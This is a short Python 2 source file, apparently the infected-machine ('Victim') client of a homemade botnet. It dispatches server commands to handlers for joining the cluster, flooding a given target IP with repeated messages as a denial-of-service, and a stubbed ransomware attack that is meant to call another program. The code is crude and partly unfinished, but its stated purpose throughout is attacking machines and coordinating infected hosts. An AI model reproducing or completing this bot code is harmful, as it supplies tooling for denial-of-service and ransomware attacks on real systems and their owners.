import socket
import logging
import threading
from messenger import *
from time import sleep

PORT = 3838


# SHOULD PROBABLY MAKE A MSG PARSER OR SOMETHING
# XXXXX
class Victim(object):

    def __init__(self):
        self.ip = get_ip()

    def send_message(self, msg):
        str_msg = str(msg)
        print ("Sending %s to Server") % str_msg
        Messenger.send_message(self.ip, PORT, str_msg)

    def receive_message(self, msg):
        print "Got %s" % msg
        return

    def process_dos_attack(self, msg):
        # MSG Looks like
        # "IP, num_packets"
        # Sleep for 0.1 since it will drop the majority of packets
        print "Target for dos attack %s" % msg
        target_ip = str(msg[0])
        num_packets = int(msg[1])
        for i in range(num_packets):
            sleep(1)
            Messenger.send_message(target_ip, PORT, "DOS")

    def process_ransomware_attack(self, msg):
        print "ransomware attack"
        # Calls Calvin's program
        pass

    def process_new_victim(self, msg):
        print "New victim to add to cluster"
        # The server should have list of all infected machines
        # Add to that list
        pass

    def processing_thread(self, msg):
        msg_type = Messenger.get_msg_type(msg)
        stripped_msg = Messenger.strip_msg(msg)
        msg_to_run = Victim.MSG_COMMANDS[msg_type](self, stripped_msg)

    # Get a message
    # Call the appropriate handler
    MSG_COMMANDS = {
        'JOIN': process_new_victim,
        'DOS': process_dos_attack,
        'RANSOMEWARE': process_ransomware_attack
    }


# Get the IP_address
# Was getting errors from the other way
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    # Returns tuple of ip and port
    return s.getsockname()[0]
